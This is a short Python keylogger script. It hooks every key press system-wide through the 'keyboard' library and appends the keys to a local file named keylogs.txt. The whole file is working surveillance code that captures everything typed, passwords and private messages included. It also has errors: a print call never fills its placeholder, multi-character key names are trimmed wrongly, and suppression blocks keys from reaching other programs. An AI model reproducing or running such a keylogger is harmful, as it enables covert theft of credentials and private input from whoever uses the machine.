import keyboard
import time

logfile = "keylogs.txt"

def write_to_log(event):
    with open(logfile, "a", encoding="utf-8") as f:
        if event.name == 'space':
            f.write('\n')
        elif event.name == 'enter':
            f.write("[{0}]\n".format(event.name.upper()))
        elif event.name == 'backspace':
            f.write("[{0}]\n".format(event.name.upper()))
        elif len(event.name) > 1:
            f.write("{}\n".format(event.name.lower()[1:]))
        else:
            f.write(event.name)
        print("Logged: \"{}\"", event.name)
    return True

try:
    keyboard.on_press(write_to_log, suppress=True)
    while 1:
        time.sleep(0.01)

except (KeyboardInterrupt, SystemExit):
    print("Exiting...")
